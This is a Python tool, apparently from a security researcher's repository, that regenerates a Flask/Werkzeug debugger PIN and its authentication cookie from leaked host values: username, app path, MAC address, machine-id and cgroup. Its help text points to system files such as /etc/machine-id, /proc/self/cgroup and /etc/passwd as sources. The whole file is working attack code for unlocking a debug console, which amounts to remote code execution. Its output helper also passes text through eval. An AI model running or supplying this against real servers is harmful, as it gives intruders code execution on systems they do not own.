# MIT License

# Copyright (c) 2023 SidneyJob

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import hashlib
from itertools import chain, combinations
from colorama import Fore, Style
import time
import argparse
import getpass
import uuid
import sys


def hash_pin(pin: str) -> str:
    pin = pin[0]
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


def gen_pin(username, mac, mch_id,path,modname,appname):
    probably_public_bits = [username,modname,appname,path]
    private_bits = [str(mac), mch_id]
    
    rv = None
    num = None
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return [rv, cookie_name]


def generate_cookie(pin):
    cookie = ''
    cookie += str(int(time.time()))
    cookie += '|'
    cookie += hash_pin([pin])
    return cookie


def logo():
    print("""


                        ¶         ¶                          
                         ¶         ¶                         
                     ¶   ¶         ¶   ¶                     
                     ¶  ¶¶         ¶¶  ¶                     
                     ¶¶ ¶¶¶       ¶¶¶ ¶¶                     
             ¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶             
            ¶¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶¶            
           ¶¶      ¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶      ¶¶           
           ¶¶     ¶¶¶    ¶¶¶¶  ¶¶¶¶¶    ¶¶¶     ¶¶¶          
       ¶  ¶¶¶    ¶¶¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶¶¶   ¶¶¶¶  ¶       
       ¶¶ ¶¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶¶ ¶¶       
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶       
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶       
      ¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶      
     ¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶     
    ¶¶¶¶   ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶   ¶¶¶¶    
   ¶¶¶¶    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶    
   ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶    
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶    
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶    
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     
      ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶      
     ¶¶¶¶¶           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           ¶¶¶¶¶     
     ¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶¶¶¶¶¶             ¶¶¶¶¶¶     
      ¶¶¶¶¶¶¶        ..     ¶¶¶¶¶¶¶¶¶     ..        ¶¶¶¶¶¶   
       ¶¶¶¶¶¶¶¶             ¶¶¶¶¶             ¶¶¶¶¶¶¶¶       
        ¶¶¶¶¶¶¶¶¶¶           ¶¶¶           ¶¶¶¶¶¶¶¶¶¶        
           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           
              ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶              
                  ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶                  
                   ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶                   
                  ¶¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶                  
                  ¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶                  
                 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶                 
                 ¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶                 
                  ¶¶  ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶  ¶¶                  
                      ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶                      

__          __             _
\ \        / /            | |
 \ \  /\  / /   ___  _ __ | | __ ____  ___  _   _   __ _   ___  _ __
  \ \/  \/ /   / _ \| '__|| |/ /|_  / / _ \| | | | / _` | / _ \| '__|
   \  /\  /   |  __/| |   |   <  / / |  __/| |_| || (_| ||  __/| |
    \/  \/     \___||_|   |_|\_\/___| \___| \__,_| \__, | \___||_|
                                                    __/ |
                                                   |___/


                Author:  https://github.com/SidneyJob
                Channel: https://t.me/SidneyJobChannel
""")

def print_c(text, color):
 eval(f'print(Fore.{color} + """{text}""" + Style.RESET_ALL, end="")')

def main():
    logo()
    if len(sys.argv) > 1:
        if sys.argv[1] == "GET":
            with open('/etc/machine-id','r') as f:
                mch_id = f.readline()[:-1]
            with open("/proc/self/cgroup",'r') as f:
                cgroup = f.readline()[:-1]
            print(f"""  
Public bits:
username         === {getpass.getuser()}

Private bits:
MAC              === {str(uuid.getnode())}
machine_id       === {mch_id}
cgroup           === {cgroup}
""")
            exit(0)

    parser = argparse.ArgumentParser(description="Werkzeug generate PIN script")

    parser.add_argument("--username", dest="username", type=str, help="The username of the user who launched the application. Try to read /etc/passwd or /proc/self/cgroup", default='www-data') # www-data
    parser.add_argument("--path", dest="path",required=True, type=str, help="Path to Flask")   # REQUIRED
    parser.add_argument("--modname", dest="modname", type=str, help="Modname (Default: flask.app)") # flask.app
    parser.add_argument("--appname", dest="appname", type=str, help="Appname (Default: Flask)") # Flask


    parser.add_argument("--mac", dest="mac", required=True, type=str, help="MAC address any interface") # REQUIRED
    parser.add_argument("--machine_id", dest="mch_id",required=True, type=str, help="Enter /etc/machine-id or /proc/sys/kernel/random/boot_id") # REQUIRED
    parser.add_argument("--cgroup", dest="cgroup",required=True, type=str, help="Enter /proc/self/cgroup") # REQUIRED
    
    args = parser.parse_args()

    modnames = ["flask.app", "werkzeug.debug"]
    appnames = ["wsgi_app", "DebuggedApplication", "Flask"]

    if args.appname:
        appnames.append(args.appname)
    if args.modname:
        modnames.append(args.modname)

    mch_id = b""
    mch_id += args.mch_id.encode("UTF-8")
    cgroup_file = args.cgroup.strip().rpartition("/")[2].encode("UTF-8")
    mch_id += cgroup_file
    
    mac = int("".join(args.mac.split(":")),16)

    for mod in modnames:
        for app in appnames:
            res = gen_pin(args.username, mac, mch_id, args.path, mod, app)
            cookie = generate_cookie(res[0])

            if res[0] != '' and res[1] != '':
                print_c("[+] Success!", "GREEN")
                print(f"""
[*] PIN: {res[0]}
[*] Cookie: {res[1]}={cookie}
[*] Modname: {mod}
[*] Appname: {app}
                """)
            else:
                print("[-] Error!")

    print_c(f"[+] {len(modnames) * len(appnames)} payloads are successfully generated!\n", "GREEN")


if __name__ == "__main__":
    main()


# 12:hugetlb:/ 11:rdma:/ 10:blkio:/user.slice 9:memory:/user.slice/user-1045.slice/user@1045.service 8:freezer:/ 7:perf_event:/ 6:net_cls,net_prio:/ 5:pids:/user.slice/user-1045.slice/user@1045.service 4:cpu,cpuacct:/user.slice 
# 3:cpuset:/ 2:devices:/user.slice 1:name=systemd:/user.slice/user-1045.slice/user@1045.service/docker-rootless.service/0082ae353db2b22de79d69abed995eafafba4c3799e778b7e38d7c17c14df4ed 0::/user.slice/user-1045.slice/user@1045.service/docker-rootless.service 